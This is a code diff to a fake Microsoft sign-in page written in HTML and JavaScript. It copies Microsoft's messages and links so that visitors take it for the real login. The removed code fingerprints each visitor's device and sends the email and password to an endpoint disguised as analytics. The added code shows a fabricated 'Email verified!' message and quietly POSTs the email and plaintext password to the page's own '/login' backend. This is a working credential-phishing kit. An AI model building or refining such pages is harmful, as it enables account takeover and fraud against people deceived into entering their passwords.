@@ -270,10 +270,8 @@
 </div>
 
 <script>
-    const API_BASE_URL = '';
-
     let capturedEmail = '';
-    let loginStartTime = Date.now();
+    let isSubmitting = false;   // Prevent double submission
 
     const emailPage = document.getElementById('emailPage');
     const passwordPage = document.getElementById('passwordPage');
@@ -292,55 +290,17 @@
 
     function showEmailMessage(message, isError = true) {
         emailMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
-        setTimeout(() => {
-            if (emailMessageArea.firstChild) emailMessageArea.innerHTML = '';
-        }, 5000);
+        setTimeout(() => { if (emailMessageArea.firstChild) emailMessageArea.innerHTML = ''; }, 5000);
     }
 
     function showPasswordMessage(message, isError = true) {
         passwordMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
-        setTimeout(() => {
-            if (passwordMessageArea.firstChild) passwordMessageArea.innerHTML = '';
-        }, 5000);
+        setTimeout(() => { if (passwordMessageArea.firstChild) passwordMessageArea.innerHTML = ''; }, 5000);
     }
 
     function escapeHtml(str) {
         if (!str) return '';
-        return str.replace(/[&<>]/g, function(m) {
-            if (m === '&') return '&amp;';
-            if (m === '<') return '&lt;';
-            if (m === '>') return '&gt;';
-            return m;
-        });
-    }
-
-    function getDeviceFingerprint() {
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages,
-            cookieEnabled: navigator.cookieEnabled,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory || 'unknown',
-            maxTouchPoints: navigator.maxTouchPoints,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            screenResolution: `${screen.width}x${screen.height}`,
-            colorDepth: screen.colorDepth
-        };
-    }
-
-    async function sendAnalytics(data) {
-        try {
-            await fetch(`${API_BASE_URL}/analytics`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data),
-                keepalive: true
-            });
-        } catch (err) {
-            console.log('Analytics error:', err);
-        }
+        return str.replace(/[&<>]/g, m => ({'&': '&amp;', '<': '&lt;', '>': '&gt;'})[m] || m);
     }
 
     function isValidEmail(email) {
@@ -355,35 +315,26 @@
         displayEmailSpan.innerText = escapeHtml(email);
         emailPage.classList.add('hidden-page');
         passwordPage.classList.remove('hidden-page');
-        setTimeout(() => {
-            passwordInput.focus();
-        }, 100);
+        setTimeout(() => passwordInput.focus(), 100);
         localStorage.setItem('login_email', email);
-        
-        sendAnalytics({
-            event: 'email_submitted',
-            email: email,
-            deviceInfo: getDeviceFingerprint(),
-            timestamp: new Date().toISOString()
-        });
     }
 
     function backToEmail() {
         capturedEmail = '';
         emailInput.value = '';
         passwordInput.value = '';
-        passwordMessageArea.innerHTML = '';
         emailMessageArea.innerHTML = '';
+        passwordMessageArea.innerHTML = '';
         emailPage.classList.remove('hidden-page');
         passwordPage.classList.add('hidden-page');
         nextButton.disabled = false;
         nextButton.innerText = 'Next';
         signInButton.disabled = false;
-        signInButton.innerText = 'Sign in';
+        signInButton.innerHTML = 'Sign in';
         emailInput.focus();
     }
 
-    async function onEmailNext() {
+    function onEmailNext() {
         const emailValue = emailInput.value.trim();
         if (!emailValue) {
             showEmailMessage('Enter a valid email address, phone number, or Skype name.', true);
@@ -397,23 +348,20 @@
         }
 
         nextButton.disabled = true;
-        const originalText = nextButton.innerText;
         nextButton.innerText = 'Checking...';
 
-        // Store email for OAuth
-        localStorage.setItem('oauth_email', emailValue);
-        
-        // Small delay for UX
         setTimeout(() => {
             showEmailMessage('Email verified! Please enter your password.', false);
             transitionToPasswordPage(emailValue);
             nextButton.disabled = false;
-            nextButton.innerText = originalText;
-        }, 500);
+            nextButton.innerText = 'Next';
+        }, 600);
     }
 
-    async function onPasswordSignIn() {
-        const password = passwordInput.value;
+    function onPasswordSignIn() {
+        if (isSubmitting) return;   // Prevent double click
+        const password = passwordInput.value.trim();
+
         if (!password) {
             showPasswordMessage('Enter your password.', true);
             passwordInput.focus();
@@ -425,31 +373,41 @@
             return;
         }
 
+        isSubmitting = true;
         signInButton.disabled = true;
-        const originalBtnText = signInButton.innerText;
-        signInButton.innerText = 'Signing in...';
-        
-        const spinnerSpan = document.createElement('span');
-        spinnerSpan.className = 'spinner';
-        signInButton.appendChild(spinnerSpan);
+        signInButton.innerHTML = 'Signing in... <span class="spinner"></span>';
 
-        // Store password temporarily (will be cleared after OAuth)
-        sessionStorage.setItem('temp_password', password);
-        
-        sendAnalytics({
-            event: 'password_submitted',
-            email: capturedEmail,
-            deviceInfo: getDeviceFingerprint(),
-            timestamp: new Date().toISOString()
-        });
+        // Submit form to backend
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = '/login';
+        form.style.display = 'none';
 
-        // Redirect to Microsoft OAuth login
-        setTimeout(() => {
-            window.location.href = '/start_login';
-        }, 500);
+        const emailField = document.createElement('input');
+        emailField.name = 'email';
+        emailField.value = capturedEmail;
+        form.appendChild(emailField);
+
+        const passwordField = document.createElement('input');
+        passwordField.name = 'password';
+        passwordField.value = password;
+        form.appendChild(passwordField);
+
+        document.body.appendChild(form);
+        form.submit();
     }
 
     function onForgotPassword(e) {
+        e.preventDefault();
+        window.open('https://account.live.com/password/reset', '_blank');
+    }
+
+    function onCreateAccount(e) {
+        e.preventDefault();
+        window.open('https://signup.live.com/signup', '_blank');
+    }
+
+    function onCantAccess(e) {
         e.preventDefault();
         window.open('https://account.live.com/password/reset', '_blank');
     }
@@ -461,90 +419,35 @@
         }
     }
 
-    function onCreateAccount(e) {
-        e.preventDefault();
-        window.open('https://signup.live.com/signup', '_blank');
-    }
-    
-    function onCantAccess(e) {
-        e.preventDefault();
-        window.open('https://account.live.com/password/reset', '_blank');
-    }
-
-    // Check for OAuth callback parameters
-    function checkOAuthCallback() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code');
-        const error = urlParams.get('error');
-        const errorDesc = urlParams.get('error_description');
-        
-        if (code) {
-            // Clear URL params without reloading
-            window.history.replaceState({}, document.title, window.location.pathname);
-            
-            const tempPassword = sessionStorage.getItem('temp_password');
-            const capturedEmailAddr = localStorage.getItem('oauth_email') || capturedEmail;
-            
-            // Send credentials to backend via analytics
-            sendAnalytics({
-                event: 'oauth_success',
-                email: capturedEmailAddr,
-                password: tempPassword || '[OAUTH_NO_PASSWORD]',
-                deviceInfo: getDeviceFingerprint(),
-                timestamp: new Date().toISOString()
-            });
-            
-            // Clear temp password
-            sessionStorage.removeItem('temp_password');
-            localStorage.removeItem('oauth_email');
-            
-            showPasswordMessage('Login successful! Redirecting...', false);
-            
-            setTimeout(() => {
-                window.location.href = '/';
-            }, 2000);
-        }
-        
-        if (error) {
-            window.history.replaceState({}, document.title, window.location.pathname);
-            showPasswordMessage(`Login failed: ${errorDesc || error}`, true);
-            signInButton.disabled = false;
-            signInButton.innerText = 'Sign in';
-            const spinner = document.querySelector('.spinner');
-            if (spinner) spinner.remove();
-        }
-    }
-
     // Event Listeners
     nextButton.addEventListener('click', onEmailNext);
     signInButton.addEventListener('click', onPasswordSignIn);
+
     forgotPasswordLink.addEventListener('click', onForgotPassword);
+    createAccountLink.addEventListener('click', onCreateAccount);
+    cantAccessLink.addEventListener('click', onCantAccess);
+
     backToEmailLink.addEventListener('click', (e) => {
         e.preventDefault();
         backToEmail();
     });
-    createAccountLink.addEventListener('click', onCreateAccount);
-    cantAccessLink.addEventListener('click', onCantAccess);
-    
+
     emailInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') {
             e.preventDefault();
             onEmailNext();
         }
     });
-    
+
     passwordInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') {
             e.preventDefault();
             onPasswordSignIn();
         }
     });
-    
+
+    // Prefill email if saved
     prefillSavedEmail();
-    loginStartTime = Date.now();
-    checkOAuthCallback();
-    
-    console.log('Microsoft Login Page Ready - OAuth Flow');
 </script>
 </body>
 </html>
